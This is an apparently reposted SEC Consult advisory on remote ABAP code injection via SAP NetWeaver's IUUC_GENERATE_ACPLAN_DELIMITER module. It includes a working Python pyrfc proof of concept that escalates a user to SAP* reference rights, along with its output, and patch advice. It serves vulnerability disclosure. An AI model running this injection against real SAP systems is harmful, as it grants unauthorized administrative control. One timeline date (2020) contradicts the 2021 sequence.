@@ -1,0 +1,176 @@
+id: 37146
+date: 12/15/2021
+title: SAP Netweaver IUUC_GENERATE_ACPLAN_DELIMITER ABAP Code Injection Exploit
+author: Raschin Tavakoli
+cves: 
+
+==============================================================================
+               title: Remote ABAP Code Injection in IUUC_GENERATE_ACPLAN_DELIMITER
+             product: SAP Netweaver
+  vulnerable version: SAP DMIS in at least 2011_1_731 <= SP 0013
+       fixed version: see solution section below
+          CVE number: n/a
+           SAP SNote: 3089831
+              impact: Critical
+      CVSS 3.1 Score: 9.1
+     CVSS 3.1 Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
+            homepage: https://www.sap.com/
+               found: 2021-07-23
+                  by: Raschin Tavakoli (Office Vienna)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+==============================================================================
+
+Vendor description:
+-------------------
+"SAP SE is a German multinational software corporation based in Walldorf,
+Baden-Württemberg, that develops enterprise software to manage business
+operations and customer relations. The company is especially known for its ERP
+software. SAP is the largest non-American software company by revenue, the
+world's third-largest publicly-traded software company by revenue, and the
+largest German company by market capitalization."
+
+Source: https://en.wikipedia.org/wiki/SAP
+
+
+Business recommendation:
+------------------------
+SAP® released the patch (SNote 3089831) and SEC Consult advises all
+SAP® customers to update their systems immediately.
+
+An in-depth security analysis performed by security professionals is
+highly advised, as the software may be affected from further security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1. Remote ABAP Code Injection in IUUC_GENERATE_ACPLAN_DELIMITER
+
+The function module IUUC_GENERATE_ACPLAN_DELIMITER allows creating and executing
+ABAP programs in the SAP internal /ILT/* and /1CADMC/* namespace. To do that it
+creates jobs that can be executed immediately or scheduled for a specific time
+in the future. An attacker with the authorizations for the function
+module is able to execute arbitrary code and take over the SAP application
+server.
+
+As the function module is remote enabled, it allows the attack to be
+performed remotely via RFC. In the majority of cases internal RFC
+communications are nowadays still found to be unencrypted. This increases the
+risk that attackers wiretap service account passwords. Once such user is
+hijacked, the attacker has gained all necessary prerequisites for further
+attacks as described in this advisory.
+
+
+Attack Prerequisites
+--------------------
+1. Remote ABAP Code Injection in IUUC_GENERATE_ACPLAN_DELIMITER
+
+The user must have at least the following authorization objects:
+
+S_DMIS:
+MBT_PR_ARE: SLOP (SAP Landscape Transformation)
+ACTVT:      03   (Display)
+
+S_BTCH_JOB:
+JOBACTION:  RELE  (Release Jobs)
+
+Further, authorization to perform function calls (S_RFC) have to be present.
+Alternatively for local execution, authorization to execute function modules
+via transaction SE37 would be necessary.
+
+
+Proof of concept:
+-----------------
+1. Remote ABAP Code Injection in IUUC_GENERATE_ACPLAN_DELIMITER
+
+As a proof of concept, a script was created that assigns
+the reference user SAP* to the attacker using the table REFUSER:
+
+* ************************************************************************** *
+#!/usr/bin/env python3
+from pyrfc import Connection
+
+import time
+
+def print_usref():
+     conn_highpriv = Connection(ashost="XX.XX.XX.XX", sysnr="00", client="001",
+                                user="DEVELOPER", passwd="Sap123456", lang='EN')
+     result = conn_highpriv.call('RFC_READ_TABLE',
+                                 QUERY_TABLE='USREFUS',
+                                 FIELDS=['MANDT', 'BNAME', 'REFUSER'],
+                                 DELIMITER='|'
+                                 )
+     column_values = []
+
+     for line in result['DATA']:
+         data = line['WA']
+         if "TEST" in data:
+             print(data)
+
+
+if __name__ == '__main__':
+     mandt = {'000', '001'}  # selected for demonstration purpose
+
+     print("Before: USREFUS WHERE BNAME = 'TEST'")
+     print_usref()
+
+     conn = Connection(ashost="XX.XX.XX.XX", sysnr="00", client="001",
+                       user="TEST", passwd="Sap123456", lang='EN')
+
+     result = conn.call('IUUC_GENERATE_ACPLAN_DELIMITER',
+                        I_REPORTNAME='/1LT/Z_EVIL',
+                        I_SCHED_IMMEDIATE='X',
+                        IT_CODE=["REPORT /1LT/Z_EVIL.",
+                                 "UPDATE USREFUS SET REFUSER = 'SAP*' ",
+                                 "WHERE BNAME = 'TEST'."
+                                 "COMMIT WORK."]
+                        )
+
+     print("\nSending payload via IUUC_RECON_RC_COUNT_TABLE_BIG and waiting 5 seconds...\n")
+
+     time.sleep(5)
+     print("After: USREFUS WHERE BNAME = 'TEST'")
+     print_usref()
+* ************************************************************************** *
+
+Running the code produces the following output:
+
+$> IUUC_GENERATE_ACPLAN_DELIMITER_poc.py
+Before: USREFUS WHERE BNAME = 'TEST'
+001|TEST        |
+
+Sending payload via IUUC_RECON_RC_COUNT_TABLE_BIG and waiting 5 seconds...
+
+After: USREFUS WHERE BNAME = 'TEST'
+001|TEST        |SAP*
+
+  
+Vulnerable / tested versions:
+-----------------------------
+This vulnerability has been tested on Netweaver 754 (Release), 0002 (SP-Level), SAP DMIS
+2011_1_731, SAPK-11613INDMIS.
+
+
+Vendor contact timeline:
+------------------------
+2021-10-20: Initial contact with vendor
+2021-10-22: Vendor informs that the discussion has been taken up to the
+             application team
+2021-11-11: Vendor informs that issue was also fixed in SAP Note 3089831
+2021-11-11: SEC Consult informs Vendor that SAP Note 3089831 fixes the
+             vulnerability but that CVE and SAP Note description is wrong
+             (No SQL Injection but ABAP Injection)
+2020-12-14: Coordinated release of security advisory
+
+
+Solution:
+---------
+SEC Consult advises all SAP® customers to implement SAP Security Note
+3089831 immediately.
+
+#  0day.today [2023-03-21]  #
